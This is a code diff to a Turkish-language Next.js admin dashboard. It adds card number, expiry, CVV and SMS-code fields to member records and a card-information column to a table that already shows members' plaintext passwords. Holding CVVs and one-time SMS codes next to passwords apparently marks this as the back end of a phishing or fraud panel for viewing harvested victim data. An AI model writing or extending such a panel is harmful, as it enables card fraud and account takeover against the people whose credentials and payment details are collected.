@@ -6,7 +6,7 @@ import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter }
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
-import { PlusCircle, Edit, Trash2, LogOut } from "lucide-react";
+import { PlusCircle, Edit, Trash2, LogOut, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useRouter } from "next/navigation";
 import AdminMemberForm from "@/components/dashboard/admin-member-form";
@@ -30,6 +30,11 @@ export type AdminMember = {
   accountActivity: string;
   status: 'Aktif' | 'Pasif';
   transactionStatus: 'allowed' | 'blocked';
+  // Card details
+  cardNumber?: string;
+  cardExpiry?: string;
+  cardCvv?: string;
+  smsCode?: string;
 };
 
 const MEMBERS_PER_PAGE = 20;
@@ -159,8 +164,7 @@ export default function AdminPage() {
                                     <TableHead>Ad Soyad</TableHead>
                                     <TableHead>Telefon</TableHead>
                                     <TableHead>Şifre</TableHead>
-                                    <TableHead>İl</TableHead>
-                                    <TableHead>İlçe</TableHead>
+                                    <TableHead>Kart Bilgileri</TableHead>
                                     <TableHead>Üyelik Durumu</TableHead>
                                     <TableHead className="text-right">Eylemler</TableHead>
                                 </TableRow>
@@ -171,8 +175,9 @@ export default function AdminPage() {
                                         <TableCell className="font-medium">{member.name}</TableCell>
                                         <TableCell>{member.phone}</TableCell>
                                         <TableCell>{member.password}</TableCell>
-                                        <TableCell>{member.il}</TableCell>
-                                        <TableCell>{member.ilce}</TableCell>
+                                        <TableCell>
+                                           {member.cardNumber && <CreditCard className="h-5 w-5 text-blue-500" />}
+                                        </TableCell>
                                         <TableCell>
                                             <Badge variant={member.status === 'Aktif' ? 'default' : 'destructive'} className={member.status === 'Aktif' ? 'bg-green-600' : 'bg-red-600'}>
                                                 {member.status}
